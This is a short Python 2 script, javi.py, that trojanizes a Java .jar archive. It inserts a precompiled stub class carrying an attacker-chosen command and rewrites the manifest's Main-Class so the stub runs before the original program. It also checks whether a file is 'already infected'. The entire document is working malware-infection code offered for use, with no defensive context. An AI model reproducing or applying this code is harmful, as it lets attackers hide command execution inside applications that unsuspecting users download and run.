# javi.py
# injects a shell into a .jar file

usage = "usage: javi <jar file> <command to be executed>"
stub = 'cd423b334.class'
stubfile = 'shell.class'

import zipfile, sys, re, warnings

if len(sys.argv) != 3:
	print usage 
	sys.exit(-1)

command = sys.argv[2] # command we're going to be injecting
zf = zipfile.ZipFile(sys.argv[1], 'a') # opening the .jar file

if any(stub in x for x in zf.namelist()):
	print 'ERROR: file %s has already been infected' % sys.argv[1]
	sys.exit(-1)

data = zf.read('META-INF/MANIFEST.MF') # read manifest
main = re.search('Main-Class: (.*)', data).group(1).strip() # find main class

shell = bytearray(open(stubfile, 'rb').read()) # read shell.class into a bytearray 

data = re.sub('Main-Class: .*', 'Main-Class: %s' % stub.split('.')[0], data) # replace Main-Class with our infected class in the manifest

shell = shell.replace('fa9c', command) # replace dummy string with command 
shell = shell.replace('c59d', main) # ^

shell[shell.find(command)-1] = len(command) # write length of command 
shell[shell.find(command)-2] = len(command) >> 8  
shell[shell.find(main)-1] = len(main) # write length of original main class name
shell[shell.find(main)-2] = len(main) >> 8

zf.writestr(stub, bytes(shell)) # write shell.class file into the .jar 

with warnings.catch_warnings():
	warnings.simplefilter('ignore')
	zf.writestr('META-INF/MANIFEST.MF', data) # update manifest 

zf.close() # close .jar